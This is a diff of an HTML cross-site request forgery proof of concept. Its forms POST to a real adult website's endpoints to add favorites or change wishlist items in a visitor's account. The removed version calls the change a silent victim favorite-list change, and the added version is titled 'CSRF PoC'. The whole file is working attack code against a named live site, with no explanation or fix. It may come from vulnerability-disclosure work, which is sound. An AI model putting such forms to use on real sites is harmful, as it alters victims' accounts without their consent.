@@ -1,9 +1,15 @@
+<!DOCTYPE html>
 <html>
-<body>
-<h3>Click the button to trigger the CSRF request silently.</h3>
-<form action="https://www.mydirtyhobby.com/n/addfavorite/43333271-Costas_Antonis" method="POST">
-<button type="submit">Change List</button>
-</form>
-<p><i>Victim favorite List change.</i></p>
-</body>
+  <head>
+    <title>CSRF PoC</title>
+  </head>
+  <body>
+    <h1>CSRF Test</h1>
+    <p>Click the button to trigger the POST request.</p>
+
+    <form action="https://www.mydirtyhobby.com/wishlist/manage/item/12711281/1" method="POST">
+      <!-- No parameters needed for this request -->
+      <input type="submit" value="Add/Remove Wishlist Item">
+    </form>
+  </body>
 </html>
